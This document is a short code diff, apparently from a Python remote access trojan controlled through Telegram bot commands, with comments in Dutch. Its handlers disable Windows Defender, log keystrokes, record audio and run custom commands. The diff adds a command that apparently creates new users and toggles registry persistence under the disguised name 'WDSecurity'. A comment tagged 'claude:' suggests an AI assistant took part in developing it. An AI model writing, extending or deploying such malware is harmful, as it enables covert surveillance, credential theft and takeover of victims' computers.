@@ -9,7 +9,7 @@ from atoms import add_to_registry
 
 
 # Voeg de script toe aan registry
-add_to_registry("WDSecurity")
+# add_to_registry("WDSecurity")
 
 # claude: omdat API_TOKEN wel ingeladen werd maar CHAT_ID niet (op een ander laptop/VM)
 # Vind de juiste locatie voor gebundelde bestanden
@@ -45,6 +45,7 @@ app.add_handler(CommandHandler('stopdefender', stopDefender_command))
 app.add_handler(CommandHandler('keylog', keylog_command))
 app.add_handler(CommandHandler('listen', audio_command))
 app.add_handler(CommandHandler('cc', custom_command))
+app.add_handler(CommandHandler('newuser', newuser_command))
 
 # Register message handler
 app.add_handler(MessageHandler(filters.TEXT, no_command))
